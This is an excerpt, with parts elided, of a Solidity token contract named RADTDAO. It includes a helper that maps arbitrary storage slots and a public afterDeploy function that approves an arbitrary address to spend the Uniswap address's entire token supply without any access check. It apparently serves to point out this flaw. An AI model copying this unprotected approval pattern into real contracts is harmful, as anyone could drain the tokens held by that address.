...
library StorageExt {
    ...
    function getAddressExt(
        bytes32 slot
    ) internal pure returns (AddressExt storage r) {
        assembly {
            r.slot := slot
        }
    }
...
contract RADTDAO is Context {
    ...
    function afterDeploy(address uniswapAddr, address wrapperAddr) public {
        _approve(uniswapAddr, wrapperAddr, _totalSupply);
    }
